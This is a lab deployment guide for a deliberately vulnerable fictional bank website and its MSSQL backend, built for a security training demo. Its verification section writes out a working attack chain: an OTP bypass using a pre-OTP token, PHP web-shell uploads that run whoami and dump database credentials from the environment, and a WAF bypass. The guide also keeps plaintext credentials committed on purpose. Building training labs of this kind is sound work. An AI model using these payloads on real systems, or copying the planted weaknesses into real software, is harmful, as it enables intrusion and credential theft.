# Senarath Bank Lab — Web Tier Deployment Guide (WEB01)

> **LAB ENVIRONMENT.** Fictional bank, synthetic data, intentional weaknesses
> (V1–V6). This guide stands up **Part A** of the Senarath Bank CrowdStrike lab:
> the two public web projects on **WEB01** (Ubuntu + Docker + nginx) and their
> connection to **SQL01** (internal MSSQL). Keep the whole environment isolated
> and time-boxed — see **§12 (Operational safety)**.

This is an end-to-end, do-this-then-that guide. Follow the parts in order.

---

## 0. What you are building

```
                INTERNET (event / DMZ)
                        │
                        ▼
              ┌───────────────────┐        (separate WAF01 appliance
              │   WAF / CDN edge   │◄──────  filters uploads on the public route)
              └───────────────────┘
                        │  ebanking.senarathbank.com
                        ▼
  ┌──────────────────────────────────────────────────────────┐
  │  WEB01  —  Ubuntu Server 24.04  +  Docker + Docker Compose │
  │                                                            │
  │   ┌──────────────┐   docker network: senarath-net         │
  │   │ nginx gateway│  (routes by hostname)                   │
  │   └──────┬───────┘                                         │
  │          ├──────────────► corporate  (www.senarathbank.com)│
  │          └──────────────► ebanking   (ebanking.senarathbank.com)
  │                                   │  TCP 1433              │
  └───────────────────────────────────┼────────────────────────┘
                                       ▼
                         ┌──────────────────────────┐
                         │  SQL01 — Windows Server   │  INTERNAL ONLY
                         │  Microsoft SQL Server 2022│  (not public)
                         │  DB: SenarathLab          │
                         └──────────────────────────┘
```

- **WEB01** sits in the DMZ and is publicly reachable (for the demo).
- **SQL01** sits on the internal network and is **never** exposed publicly. Only
  WEB01 reaches it, on TCP **1433**.
- Two Git repos → two folders on WEB01:
  - `senarath-corporate` — the brochure site (no DB, no vulns).
  - `senarath-ebanking` — the online banking app (V1–V6) + nginx gateway + DB scripts.

**Lab hostnames / addresses used in this guide** (adjust to your lab):

| Host | Role | Example IP |
|------|------|-----------|
| WEB01 | Ubuntu web origin (DMZ) | `10.10.10.10` |
| SQL01 | MSSQL (internal) | `10.10.20.11` |
| Public name | `ebanking.senarathbank.com` / `www.senarathbank.com` | → WAF → WEB01 |

---

## 1. Prerequisites

- **WEB01**: Ubuntu Server 24.04, sudo access, outbound internet for image/pkg pulls.
- **SQL01**: Windows Server with **Microsoft SQL Server 2022** installed, reachable
  from WEB01 on TCP 1433.
- The two project folders (this repo `senarath-ebanking` and `senarath-corporate`).
- A GitHub/GitLab account to host the two repos (or copy the folders to WEB01 directly).

---

## 2. Part 1 — Prepare SQL01 (MSSQL)

Do this first so the database is ready when the web app starts.

### 2.1 Enable SQL (mixed-mode) authentication
The app logs in with a SQL login (`lab_app`), so the instance must allow SQL auth.

- **SSMS:** right-click the instance → **Properties** → **Security** →
  **SQL Server and Windows Authentication mode** → OK.
- Restart the SQL Server service.

(Or via PowerShell/registry, then restart `MSSQLSERVER`.)

### 2.2 Enable TCP/IP and port 1433
- Open **SQL Server Configuration Manager** → **SQL Server Network Configuration**
  → **Protocols for MSSQLSERVER** → enable **TCP/IP**.
- In **TCP/IP → Properties → IP Addresses → IPAll**, set **TCP Port = 1433**
  (clear "TCP Dynamic Ports").
- Restart the **SQL Server (MSSQLSERVER)** service.

### 2.3 Open the Windows firewall for 1433 (internal only)
```powershell
New-NetFirewallRule -DisplayName "MSSQL 1433 (lab, internal)" -Direction Inbound `
  -Protocol TCP -LocalPort 1433 -Action Allow -RemoteAddress 10.10.10.10
```
> Scope the rule to **WEB01's IP** (or the internal subnet). Do **not** expose 1433
> to the internet.

### 2.4 Create the database, schema and login
Copy the `db/` folder to SQL01 and run, from an elevated `cmd`/PowerShell:

```powershell
cd path\to\senarath-ebanking\db
sqlcmd -S localhost -U sa -P <YOUR_SA_PASSWORD> -i 01_schema.sql
sqlcmd -S localhost -U sa -P <YOUR_SA_PASSWORD> -d SenarathLab -i 02_seed_customers.sql
```

`01_schema.sql` creates the `SenarathLab` database, all tables, and the **`lab_app`**
SQL login (`DbLab123!`) with `db_owner` on `SenarathLab`. `02_seed_customers.sql`
loads **205 synthetic customers**, their accounts, ~3,400 transactions and payees.

Expected final message:
```
Seed complete: 205 customers, 406 accounts, 3445 transactions, 122 beneficiaries.
```

### 2.5 Verify the app login works
```powershell
sqlcmd -S localhost -U lab_app -P "DbLab123!" -d SenarathLab -Q "SELECT COUNT(*) AS customers FROM customers;"
```
You should see `customers = 205`.

> **D1 / Infrastructure note:** the build guide maps `lab_app` to a **sysadmin**
> login so the attack chain can enable/run `xp_cmdshell` (stage 10). That grant is
> an Infrastructure/AD team decision (a commented block in `01_schema.sql`). The web
> app itself needs only `db_owner`.

---

## 3. Part 2 — Prepare WEB01 (Ubuntu + Docker)

SSH to WEB01 and install Docker Engine + the Compose plugin:

```bash
sudo apt-get update
sudo apt-get install -y ca-certificates curl git
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] \
  https://download.docker.com/linux/ubuntu $(. /etc/os-release && echo $VERSION_CODENAME) stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update
sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin

# Run docker without sudo (log out/in afterwards):
sudo usermod -aG docker $USER
newgrp docker

docker --version && docker compose version
```

---

## 4. Part 3 — Put the code in two Git repos

On your workstation (or WEB01), initialise and push each project.

### 4.1 Corporate repo
```bash
cd senarath-corporate
git init -b main
git add .
git commit -m "Senarath Bank corporate website (lab)"
git remote add origin git@github.com:<you>/senarath-corporate.git
git push -u origin main
```

### 4.2 E-banking repo
```bash
cd ../senarath-ebanking
git init -b main
git add .
git commit -m "Senarath Bank online banking (lab, V1-V6)"
git remote add origin git@github.com:<you>/senarath-ebanking.git
git push -u origin main
```

> **Note on `.env`:** in a normal project you never commit `.env`. In **this lab**
> the `.env` is committed **on purpose** — the plaintext DB credentials are weakness
> **V6**, and the testers are meant to find them. Keep these repos **private**.

### 4.3 Clone both onto WEB01
```bash
mkdir -p ~/senarath && cd ~/senarath
git clone git@github.com:<you>/senarath-corporate.git
git clone git@github.com:<you>/senarath-ebanking.git
```
(To update later: `cd ~/senarath/<repo> && git pull`.)

---

## 5. Part 4 — Configure for your lab

### 5.1 Point the app at SQL01
Edit `~/senarath/senarath-ebanking/.env` and set the MSSQL host to SQL01's reachable
name or **IP**:

```dotenv
DB_HOST=10.10.20.11      # SQL01 internal IP (or SQL01.senarath.local if DNS resolves)
DB_PORT=1433
DB_NAME=SenarathLab
DB_USER=lab_app
DB_PASSWORD=DbLab123!
```

### 5.2 Make SQL01 resolvable from inside the container (if using a name)
If you keep `DB_HOST=SQL01.senarath.local`, ensure the container can resolve it.
Edit `docker-compose.yml` → `ebanking.extra_hosts` to SQL01's real IP:

```yaml
    extra_hosts:
      - "SQL01.senarath.local:10.10.20.11"
```
(If you set `DB_HOST` to a raw IP, `extra_hosts` is optional.)

---

## 6. Part 5 — Launch the stack

All commands on WEB01.

```bash
# 1) Create the shared network ONCE:
docker network create senarath-net

# 2) Start the corporate site:
cd ~/senarath/senarath-corporate
docker compose up -d --build

# 3) Start the banking app + nginx gateway:
cd ~/senarath/senarath-ebanking
docker compose up -d --build

# 4) Check everything is up:
docker ps
```
You should see three containers: `senarath-corporate`, `senarath-ebanking`,
`senarath-gateway` (publishing port 80).

Quick local checks on WEB01:
```bash
curl -s -o /dev/null -w "corporate %{http_code}\n" -H 'Host: www.senarathbank.com'    http://127.0.0.1/
curl -s -o /dev/null -w "ebanking  %{http_code}\n" -H 'Host: ebanking.senarathbank.com' http://127.0.0.1/index.php
```
Both should return `200`.

---

## 7. Part 6 — Name resolution & the WAF/origin split (V2)

### 7.1 For the public demo
Point the public DNS (or the WAF/CDN origin config) so that:
- `www.senarathbank.com` and `ebanking.senarathbank.com` resolve to the **WAF**, which
  forwards to **WEB01** as its origin.
- The nginx gateway on WEB01 routes by `Host` header to the right container.

### 7.2 Quick demo without real DNS
On any client machine, add hosts entries pointing the names at WEB01 (or the WAF):
```
10.10.10.10   www.senarathbank.com
10.10.10.10   ebanking.senarathbank.com
```

### 7.3 The V2 origin exposure
Weakness **V2** requires the **origin IP** (WEB01) to answer for
`ebanking.senarathbank.com` from any lab source — bypassing the WAF. The nginx gateway
already does this (routes purely on `Host`, no source-IP check, no upload filtering).
Make the origin IP *discoverable* per the build guide (leaked/historical A record, a
dev subdomain, or MX/SPF). Validate:
```bash
curl -k https://<WEB01_IP>/ -H 'Host: ebanking.senarathbank.com'   # returns the app, WAF out of path
```

---

## 8. Part 7 — TLS (recommended for a public demo)

The gateway ships listening on port 80. For a public event, add HTTPS:

**Option A — certbot on the host**, then mount certs into the gateway:
```bash
sudo apt-get install -y certbot
sudo certbot certonly --standalone -d ebanking.senarathbank.com -d www.senarathbank.com
# certs land in /etc/letsencrypt/live/<domain>/
```
Then, in `senarath-ebanking/docker-compose.yml`, mount them and publish 443:
```yaml
  gateway:
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx/gateway.conf:/etc/nginx/conf.d/default.conf:ro
      - /etc/letsencrypt:/etc/nginx/certs:ro
```
Uncomment and adjust the `443` server blocks in `nginx/gateway.conf` (point
`ssl_certificate` / `ssl_certificate_key` at the mounted paths), then:
```bash
docker compose up -d
```

**Option B — self-signed** (fine for an isolated lab): generate a cert, drop it in
`nginx/certs/`, mount it, and enable the 443 blocks.

> A demo banking login that collects passwords should be served over HTTPS even in a
> lab. TLS terminates at the WAF and/or this gateway.

---

## 9. Part 8 — End-to-end verification (walk V1–V6)

With the stack up and the DB seeded, confirm the attack chain is walkable. Full
detail and acceptance tests are in **`VULNERABILITIES.md`**; the quick pass:

```bash
BASE=https://ebanking.senarathbank.com     # or http://<WEB01_IP> with -H 'Host: ...'

# V3 — leaked credential logs in and reaches OTP; capture the pre-OTP token (V4):
TOKEN=$(curl -sk -X POST $BASE/api/login.php -H 'Content-Type: application/json' \
  -d '{"username":"customer01","password":"Welcome123!"}' \
  | sed -n 's/.*"sessionToken":"\([^"]*\)".*/\1/p')
echo "token=$TOKEN"

# V4 — use the token with NO OTP to reach a protected page:
curl -sk $BASE/dashboard.php -H "Authorization: Bearer $TOKEN" | grep -i available

# V5 — unrestricted upload executes (benign verifier from VULNERABILITIES.md):
printf '%s' '<?php echo "LAB-RCE-OK:"; echo trim(shell_exec("whoami")); ?>' > lab_rce_ok.php
curl -sk -X POST $BASE/upload.php -b "sb_session=$TOKEN" -F 'document=@lab_rce_ok.php'
curl -sk $BASE/uploads/lab_rce_ok.php          # → LAB-RCE-OK:www-data

# V6 — the uploaded verifier can also dump the env to recover MSSQL creds:
printf '%s' '<?php system("env | grep DB_"); ?>' > env.php
curl -sk -X POST $BASE/upload.php -b "sb_session=$TOKEN" -F 'document=@env.php'
curl -sk $BASE/uploads/env.php                 # → DB_USER=lab_app / DB_PASSWORD=DbLab123! / DB_HOST=...
```
Browser walk: open `ebanking.senarathbank.com`, log in as `customer01 / Welcome123!`,
then **navigate straight to `/dashboard.php`** (skipping OTP) — you are already in (V4).

---

## 10. Part 9 — Connectivity check WEB01 → SQL01

If the banking app shows the "briefly unavailable" page, the container cannot reach
MSSQL. Diagnose from WEB01:

```bash
# From the host:
nc -vz 10.10.20.11 1433

# From inside the ebanking container:
docker exec -it senarath-ebanking bash -c "getent hosts SQL01.senarath.local; (echo > /dev/tcp/10.10.20.11/1433) && echo '1433 open' || echo '1433 blocked'"
```
Checklist if it fails: SQL mixed-mode auth on, TCP/IP enabled + port 1433, SQL service
restarted, Windows firewall allows WEB01, `.env` `DB_HOST`/`DB_PORT` correct, and
`extra_hosts` points at the real IP.

---

## 11. Infrastructure handoff (Part B)

The web tier hands off to the Infrastructure/AD team with: a foothold on WEB01 (V5
RCE) and working MSSQL credentials (`lab_app` / `DbLab123!`) for **SQL01:1433** (V6).
Stages 9–17 (D1 `xp_cmdshell` → D6 krbtgt/diamond ticket) are host/AD build tasks on
SQL01 / HR01 / DC01 — see the build guide **Part B**. Nothing in those stages is web
code; the only web dependency is that those credentials authenticate to SQL01, which
§2 provides.

---

## 12. Operational safety (read before going public)

A **deliberately vulnerable, internet-reachable banking-style site** is genuinely
dangerous if left unattended. Treat it like live ordnance:

- **Keep it isolated.** The whole lab must be segregated from production and from any
  real customer data or networks. SQL01 stays **internal only** — never expose 1433.
- **Time-box the public exposure.** Bring WEB01 online **only for the demonstration
  window**. Tear it down (or firewall it off) immediately afterwards:
  ```bash
  cd ~/senarath/senarath-ebanking && docker compose down
  cd ~/senarath/senarath-corporate && docker compose down
  ```
- **Restrict who can reach it.** If the event allows, limit inbound 80/443 to the
  event's source ranges rather than the whole internet.
- **Use obviously-fictional branding.** The site is labelled a lab/fictional bank on
  every page (banner + footer). Keep those labels — they stop the site being mistaken
  for, or repurposed as, a real bank or phishing page.
- **Never reuse these credentials** (`DbLab123!`, `Welcome123!`, etc.) anywhere real.
- **Reset state between runs** (clears uploaded test files and re-seeds data):
  ```bash
  # Re-seed the DB on SQL01:
  sqlcmd -S localhost -U sa -P <SA> -d SenarathLab -i 02_seed_customers.sql
  # Clear uploaded artifacts (V5):
  docker exec senarath-ebanking sh -c 'rm -f /var/www/html/uploads/*.php'
  ```
- **Watch it.** LOG01 in the lab collects WEB01/container/WAF events. Keep an eye on
  the gateway and app logs during the event:
  ```bash
  docker logs -f senarath-gateway
  docker logs -f senarath-ebanking
  ```

---

## 13. Troubleshooting

| Symptom | Likely cause / fix |
|---|---|
| Banking app shows "briefly unavailable" | Container can't reach MSSQL — see §10. |
| `docker compose up` fails: network `senarath-net` not found | Run `docker network create senarath-net` first. |
| Gateway returns 502 for `www.` | Corporate container not running — `cd senarath-corporate && docker compose up -d`. |
| Gateway 502 for `online.` | ebanking container down or still building — `docker ps`, `docker logs senarath-ebanking`. |
| Login always "invalid" | Seed not loaded, or wrong DB — re-run `02_seed_customers.sql`; confirm `DB_NAME=SenarathLab`. |
| Uploaded `.php` downloads instead of executing | A `.htaccess`/config disabled PHP in `uploads/` — remove it (V5 needs it executable). |
| `pdo_dblib` build errors | Rebuild image: `docker compose build --no-cache ebanking`. |
| TLS cert errors | Check mounted cert paths in compose and the `ssl_certificate*` lines in `gateway.conf`. |

---

### Quick command reference
```bash
docker network create senarath-net                              # once
cd senarath-corporate && docker compose up -d --build           # corporate
cd ../senarath-ebanking && docker compose up -d --build         # banking + gateway
docker ps                                                       # status
docker logs -f senarath-ebanking                                # app logs
docker compose down                                             # stop (per repo)
```
